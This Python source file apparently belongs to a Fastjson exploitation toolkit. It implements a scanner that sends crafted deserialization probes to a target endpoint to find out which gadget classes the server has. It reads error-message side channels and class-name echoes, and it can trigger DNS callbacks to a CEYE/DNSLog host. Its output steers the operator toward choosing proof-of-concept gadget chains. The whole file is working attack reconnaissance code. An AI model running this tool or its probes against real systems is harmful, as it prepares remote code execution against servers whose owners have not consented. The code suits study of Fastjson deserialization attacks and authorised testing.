"""Fastjson classpath / dependency existence detector."""

from __future__ import annotations

import re
from concurrent.futures import ThreadPoolExecutor, as_completed
from typing import Mapping, Optional, Sequence
from urllib.parse import urlparse

from fastjson_toolkit.deps.catalog import DepEntry, default_catalog
from fastjson_toolkit.deps.models import DepHit, DepsResult
from fastjson_toolkit.deps.probes import (
    CANARY_ABSENT_CLASS,
    CANARY_PRESENT_CLASS,
    character_payload,
    class_payload,
    dns_locale_payload,
    response_indicates_character_broken,
    response_indicates_class_absent,
    response_indicates_class_loaded,
    response_indicates_class_not_loaded,
    response_indicates_class_present,
)
from fastjson_toolkit.dnslog import CeyeClient, CeyeConfig
from fastjson_toolkit.http.client import HttpClient

_DNS_LABEL_SAFE = re.compile(r"[^a-zA-Z0-9-]+")


def _excerpt(text: str, limit: int = 400) -> str:
    text = (text or "").replace("\r", "\\r").replace("\n", "\\n")
    return text if len(text) <= limit else text[: limit - 3] + "..."


def _resolve_url(target: str) -> str:
    parsed = urlparse(target)
    if not parsed.scheme:
        return "http://" + target
    return target


def _dns_tag(clazz: str, index: int) -> str:
    """Short CEYE/DNSLog-safe tag derived from class simple name."""
    simple = clazz.rsplit(".", 1)[-1]
    slug = _DNS_LABEL_SAFE.sub("", simple).lower()[:8] or "cls"
    return f"d{index:02d}{slug}"[:18]


class FastjsonDepsDetector:
    def __init__(
        self,
        timeout: float = 10.0,
        headers: Optional[Mapping[str, str]] = None,
        proxy: Optional[str] = None,
        verify_tls: bool = True,
        dnslog_host: Optional[str] = None,
        ceye: Optional[CeyeConfig] = None,
        ceye_wait: float = 10.0,
        content_type: str = "application/json",
        concurrency: int = 6,
    ) -> None:
        self.client = HttpClient(
            timeout=timeout, headers=headers, proxy=proxy, verify=verify_tls
        )
        self.dnslog_host = dnslog_host
        self.ceye_config = ceye
        self.ceye_wait = ceye_wait
        self.content_type = content_type
        self.concurrency = max(1, min(concurrency, 20))
        self._ceye: Optional[CeyeClient] = CeyeClient(ceye) if ceye else None

    def close(self) -> None:
        self.client.close()
        if self._ceye is not None:
            self._ceye.close()

    def scan(
        self,
        target: str,
        *,
        method: str = "character",
        entries: Optional[Sequence[DepEntry]] = None,
        classes: Optional[Sequence[str]] = None,
        categories: Optional[Sequence[str]] = None,
    ) -> DepsResult:
        url = _resolve_url(target)
        catalog = list(entries) if entries is not None else default_catalog()
        explicit_classes = bool(classes)
        if categories and not explicit_classes:
            cats = {c.strip().lower() for c in categories if c and c.strip()}
            catalog = [e for e in catalog if e.category.lower() in cats]
        if classes:
            wanted = {c.strip() for c in classes if c and c.strip()}
            known = {e.clazz: e for e in catalog if e.clazz in wanted}
            catalog = [known[c] if c in known else DepEntry(clazz=c, description=c) for c in wanted]

        method_norm = (method or "character").strip().lower()
        if method_norm not in ("character", "class", "dns"):
            method_norm = "character"

        notes: list[str] = []
        if method_norm == "dns":
            notes.append(
                "DNS Locale 探针版本与 autoType 敏感，本地靶场经常无 DNS；"
                "若失败请改用 character / class 方法。"
            )
            return self._scan_dns(url, catalog, notes)
        if method_norm == "class":
            notes.append(
                "Class MiscCodec 探针：类存在 → 响应回显类名字符串；不存在 → null。"
                "适用于多数 AutoType 关闭场景。"
            )
            return self._scan_class(url, catalog, notes)
        # character：先校准，AutoType 关闭时自动降级到 Class 探针
        notes.append(
            "Character 探针依赖 AutoType/MiscCodec 畸形路径："
            "类存在 → can not cast to char；"
            "明确不存在 → No message available / autoType is not support 等。"
        )
        return self._scan_character_auto(url, catalog, notes)

    def _post(self, url: str, payload: str):
        return self.client.post_raw(url, payload, self.content_type)

    def _calibrate_error_oracle(self, url: str, notes: list[str]) -> str:
        """Return ``character`` / ``class`` / ``none`` after canary probes."""
        char_present_payload = character_payload(CANARY_PRESENT_CLASS)
        char_absent_payload = character_payload(CANARY_ABSENT_CLASS)
        try:
            present_resp = self._post(url, char_present_payload)
            absent_resp = self._post(url, char_absent_payload)
        except Exception as exc:  # noqa: BLE001
            notes.append(f"Character 校准请求失败: {type(exc).__name__}: {exc}")
            present_resp = absent_resp = None

        if present_resp is not None and absent_resp is not None:
            present_ok = response_indicates_class_present(present_resp.text or "")
            absent_cast = response_indicates_class_present(absent_resp.text or "")
            if present_ok and not absent_cast:
                notes.append("校准：Character 报错侧信道可用（canary String 命中 cast）")
                return "character"
            if response_indicates_character_broken(
                present_resp.text or ""
            ) or response_indicates_character_broken(absent_resp.text or ""):
                notes.append(
                    "校准：Character 探针触发 not close json text / 语法错误，"
                    "典型于 AutoType 关闭；改用 Class MiscCodec 探针"
                )

        try:
            class_present = self._post(url, class_payload(CANARY_PRESENT_CLASS))
            class_absent = self._post(url, class_payload(CANARY_ABSENT_CLASS))
        except Exception as exc:  # noqa: BLE001
            notes.append(f"Class 校准请求失败: {type(exc).__name__}: {exc}")
            return "none"

        if response_indicates_class_loaded(
            class_present.text or "", CANARY_PRESENT_CLASS
        ) and response_indicates_class_not_loaded(
            class_absent.text or "", CANARY_ABSENT_CLASS
        ):
            notes.append(
                "校准：Class MiscCodec 可用（String 回显类名，缺失类 → null）"
            )
            return "class"

        notes.append(
            "校准：Character 与 Class 探针均未建立可靠 miss/hit 基线；"
            "结果可能大量 unknown"
        )
        return "none"

    def _scan_character_auto(
        self, url: str, catalog: list[DepEntry], notes: list[str]
    ) -> DepsResult:
        oracle = self._calibrate_error_oracle(url, notes)
        if oracle == "class":
            return self._scan_class(url, catalog, notes)
        if oracle == "none":
            notes.append("仍按 Character 模板扫描（无可靠基线，请人工核对响应）")
        return self._scan_character(url, catalog, notes)

    def _judge_character(self, text: str) -> tuple[str, list[str]]:
        present = response_indicates_class_present(text)
        matched: list[str] = []
        if present:
            matched.append("can not cast to char")
            return "present", matched
        if response_indicates_character_broken(text):
            matched.append("not close json text")
            return "unknown", matched
        if response_indicates_class_absent(text):
            lower = text.lower()
            if "no message available" in lower:
                matched.append("No message available")
            elif "autotype is not support" in lower:
                matched.append("autoType is not support")
            else:
                matched.append("class not found")
            return "absent", matched
        return "unknown", matched

    def _judge_class(self, text: str, clazz: str) -> tuple[str, list[str]]:
        matched: list[str] = []
        if response_indicates_class_loaded(text, clazz):
            matched.append("class_name_echo")
            return "present", matched
        if response_indicates_class_not_loaded(text, clazz):
            body = (text or "").strip().lower()
            if body in ("null", ""):
                matched.append("null")
            elif response_indicates_class_absent(text):
                matched.append("class not found")
            else:
                matched.append("not_loaded")
            return "absent", matched
        return "unknown", matched

    def _scan_character(
        self, url: str, catalog: list[DepEntry], notes: list[str]
    ) -> DepsResult:
        results: list[DepHit] = []

        def _one(entry: DepEntry) -> DepHit:
            payload = character_payload(entry.clazz)
            try:
                resp = self._post(url, payload)
            except Exception as exc:  # noqa: BLE001
                return DepHit(
                    clazz=entry.clazz,
                    description=entry.description,
                    category=entry.category,
                    status="error",
                    method="character",
                    payload=payload,
                    error=f"{type(exc).__name__}: {exc}",
                )
            text = resp.text or ""
            status, matched = self._judge_character(text)
            return DepHit(
                clazz=entry.clazz,
                description=entry.description,
                category=entry.category,
                status=status,  # type: ignore[arg-type]
                method="character",
                matched=matched,
                status_code=resp.status_code,
                elapsed_ms=round(resp.elapsed_ms, 2),
                response_excerpt=_excerpt(text),
                payload=payload,
            )

        workers = min(self.concurrency, max(1, len(catalog)))
        if workers == 1 or len(catalog) <= 1:
            results = [_one(e) for e in catalog]
        else:
            with ThreadPoolExecutor(max_workers=workers) as pool:
                futs = {pool.submit(_one, e): e for e in catalog}
                by_class: dict[str, DepHit] = {}
                for fut in as_completed(futs):
                    entry = futs[fut]
                    by_class[entry.clazz] = fut.result()
                results = [by_class[e.clazz] for e in catalog]

        return self._finalize(
            url, "character", results, notes, dns_filter=None, dns_records=[]
        )

    def _scan_class(
        self, url: str, catalog: list[DepEntry], notes: list[str]
    ) -> DepsResult:
        results: list[DepHit] = []

        def _one(entry: DepEntry) -> DepHit:
            payload = class_payload(entry.clazz)
            try:
                resp = self._post(url, payload)
            except Exception as exc:  # noqa: BLE001
                return DepHit(
                    clazz=entry.clazz,
                    description=entry.description,
                    category=entry.category,
                    status="error",
                    method="class",
                    payload=payload,
                    error=f"{type(exc).__name__}: {exc}",
                )
            text = resp.text or ""
            status, matched = self._judge_class(text, entry.clazz)
            return DepHit(
                clazz=entry.clazz,
                description=entry.description,
                category=entry.category,
                status=status,  # type: ignore[arg-type]
                method="class",
                matched=matched,
                status_code=resp.status_code,
                elapsed_ms=round(resp.elapsed_ms, 2),
                response_excerpt=_excerpt(text),
                payload=payload,
            )

        workers = min(self.concurrency, max(1, len(catalog)))
        if workers == 1 or len(catalog) <= 1:
            results = [_one(e) for e in catalog]
        else:
            with ThreadPoolExecutor(max_workers=workers) as pool:
                futs = {pool.submit(_one, e): e for e in catalog}
                by_class: dict[str, DepHit] = {}
                for fut in as_completed(futs):
                    entry = futs[fut]
                    by_class[entry.clazz] = fut.result()
                results = [by_class[e.clazz] for e in catalog]

        return self._finalize(
            url, "class", results, notes, dns_filter=None, dns_records=[]
        )

    def _scan_dns(
        self, url: str, catalog: list[DepEntry], notes: list[str]
    ) -> DepsResult:
        dns_filter: Optional[str] = None
        base_host: Optional[str] = None

        if self._ceye is not None:
            dns_filter = CeyeClient.new_filter("dp")
            base_host = self._ceye.config.domain
        elif self.dnslog_host:
            base_host = self.dnslog_host.strip().rstrip(".")
            if "://" in base_host:
                base_host = base_host.split("://", 1)[1]
            base_host = base_host.split("/", 1)[0]
        else:
            notes.append("未配置 CEYE / DNSLog，DNS 依赖探测无法确认出网。")
            # Still send payloads with a placeholder so evidence shows what would be sent.
            base_host = "unset.dnslog.invalid"

        results: list[DepHit] = []
        tag_by_class: dict[str, str] = {}

        for i, entry in enumerate(catalog):
            tag = _dns_tag(entry.clazz, i)
            tag_by_class[entry.clazz] = tag
            if self._ceye is not None and dns_filter:
                host = f"{tag}.{dns_filter}.{base_host}"
            else:
                host = f"{tag}.{base_host}"
            payload = dns_locale_payload(entry.clazz, host)
            try:
                resp = self.client.post_raw(url, payload, self.content_type)
                hit = DepHit(
                    clazz=entry.clazz,
                    description=entry.description,
                    category=entry.category,
                    status="unknown",
                    method="dns",
                    matched=[],
                    status_code=resp.status_code,
                    elapsed_ms=round(resp.elapsed_ms, 2),
                    response_excerpt=_excerpt(resp.text),
                    payload=payload,
                    dns_filter=dns_filter,
                    dns_hit=None,
                )
            except Exception as exc:  # noqa: BLE001
                hit = DepHit(
                    clazz=entry.clazz,
                    description=entry.description,
                    category=entry.category,
                    status="error",
                    method="dns",
                    payload=payload,
                    dns_filter=dns_filter,
                    error=f"{type(exc).__name__}: {exc}",
                )
            results.append(hit)

        dns_records: list[dict] = []
        if self._ceye is not None and dns_filter:
            try:
                records = self._ceye.wait_for_dns(
                    dns_filter,
                    timeout=self.ceye_wait,
                    interval=1.0,
                    settle=True,
                )
                dns_records = [
                    {
                        "name": r.name,
                        "remote_addr": r.remote_addr,
                        "created_at": r.created_at,
                    }
                    for r in records
                ]
                record_names = [(r.name or "").lower() for r in records]
                any_dns = bool(record_names)
                if not any_dns:
                    notes.append(
                        "CEYE 无 DNS 记录：链路可能未触发（版本/autoType/不出网）；"
                        "结果保持 unknown，勿当作类不存在。"
                    )
                for hit in results:
                    if hit.status == "error":
                        continue
                    tag = tag_by_class.get(hit.clazz, "").lower()
                    found = bool(tag) and any(
                        name.startswith(f"{tag}.") or f".{tag}." in f".{name}."
                        for name in record_names
                    )
                    hit.dns_hit = found if any_dns else None
                    if found:
                        hit.status = "present"
                        hit.matched = [f"dns:{tag}"]
                    elif any_dns:
                        # Same filter produced hits elsewhere → safer to call miss absent.
                        hit.status = "absent"
                    else:
                        hit.status = "unknown"
            except Exception as exc:  # noqa: BLE001
                notes.append(f"CEYE 轮询失败: {type(exc).__name__}: {exc}")
                for hit in results:
                    if hit.status != "error":
                        hit.status = "unknown"
                        hit.error = "ceye_poll_failed"
        else:
            notes.append(
                "无 CEYE 轮询时，DNS 结果保持 unknown；请到 DNSLog 平台按 payload 中的 country 域名核对。"
            )

        return self._finalize(
            url, "dns", results, notes, dns_filter=dns_filter, dns_records=dns_records
        )

    def _finalize(
        self,
        target: str,
        method: str,
        results: list[DepHit],
        notes: list[str],
        *,
        dns_filter: Optional[str],
        dns_records: list[dict],
    ) -> DepsResult:
        present = [h for h in results if h.status == "present"]
        absent_count = sum(1 for h in results if h.status == "absent")
        unknown_count = sum(1 for h in results if h.status == "unknown")
        error_count = sum(1 for h in results if h.status == "error")

        if not results:
            summary = "未选择任何依赖类进行扫描"
        elif method == "character":
            summary = (
                f"Character 依赖探测完成：发现 {len(present)}/{len(results)} 个类存在"
            )
        elif method == "class":
            summary = (
                f"Class MiscCodec 依赖探测完成：发现 {len(present)}/{len(results)} 个类存在"
            )
        else:
            summary = (
                f"DNS 依赖探测完成：确认 {len(present)}/{len(results)} 个类"
                f"（unknown={unknown_count}, error={error_count}）"
            )

        next_actions: list[str] = []
        if present:
            cats = sorted({h.category for h in present})
            next_actions.append(
                "poc_catalog → 按已确认依赖选 gadget；poc_get(family=…, gadget=…)"
            )
            next_actions.append(f"已确认类别：{', '.join(cats)}")
        if method == "dns" and not present and unknown_count:
            next_actions.append(
                "deps_probe(method=character) 复测（自动校准 Character/Class）"
            )
        if method in ("character", "class") and unknown_count and not present:
            broken = sum(
                1
                for h in results
                if "not close json text" in (h.matched or [])
            )
            if broken and method == "character":
                next_actions.append(
                    "deps_probe(method=class) 强制 Class MiscCodec；"
                    "或确认 target 为反序列化点"
                )
            else:
                next_actions.append(
                    "大量 unknown：核对 Content-Type / 反序列化点；"
                    "可试 deps_probe(method=dns)（需 CEYE）"
                )
        elif method in ("character", "class") and not present and results:
            next_actions.append(
                "若怀疑误判，缩小 categories/classes 复测，或 deps_probe(method=dns)"
            )
        if not next_actions:
            next_actions.append(
                "确认 target 为 Fastjson 反序列化 POST 点（如 /api/fastjson），"
                "而非站点根路径"
            )

        return DepsResult(
            target=target,
            method=method,  # type: ignore[arg-type]
            scanned=len(results),
            present_count=len(present),
            absent_count=absent_count,
            unknown_count=unknown_count,
            error_count=error_count,
            present=present,
            results=results,
            dns_filter=dns_filter,
            dns_records=dns_records,
            summary=summary,
            next_actions=next_actions,
            notes=notes,
            raw={
                "concurrency": self.concurrency,
                "ceye_domain": self.ceye_config.domain if self.ceye_config else None,
                "dnslog_host": self.dnslog_host,
                "oracle": method,
            },
        )
